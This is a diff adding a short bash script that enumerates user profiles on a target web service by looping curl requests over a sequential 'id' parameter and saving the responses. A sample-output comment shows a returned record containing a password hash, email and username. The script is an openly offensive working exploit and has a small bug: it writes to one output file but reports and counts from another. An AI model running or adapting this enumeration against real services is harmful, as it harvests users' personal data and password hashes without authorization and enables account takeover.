@@ -1,0 +1,27 @@
+#!/bin/bash
+
+# This script will enumerate users by tampering with 
+# The `id` paramter found in the `robots.txt` file, where `/user_profile?id=[user-id]`.
+# Manually tested the ranges so the boundaries may or may not be exact.
+# Alternatively you can swap out the harcoded values with your own desired ranges.
+# Usage: ./fuzz-user-profiles https://[url]/path?parameter=[user-id]
+
+# User Supplied URL
+URL=$1
+
+# Create the Output File
+touch fuzzed_user_profiles.results
+
+# Start..End Range - User ID's 
+for id in {235900..235960}; do 
+        echo "[+] - Searching User ID: $id"
+	curl -s "$1/user_profile?id=$id" -w "\n"  >> fuzzed_user_profiles.results;
+done
+
+echo "[+] Done Enumerating Shred Users!"
+echo "[+] Total Users: $(cat shred_user_profiles.txt | wc -l)"
+echo "[+] Output saved to shred_user_profiles.txt"
+
+# Sample Output
+# {"profile":{"user_id":"235958","password_hash":"ef8420d70dd7676e04bea55f405fa39b022a90c8","email":"Loyal.Huels@yahoo.com","username":"Loyal_Huels"}}
+
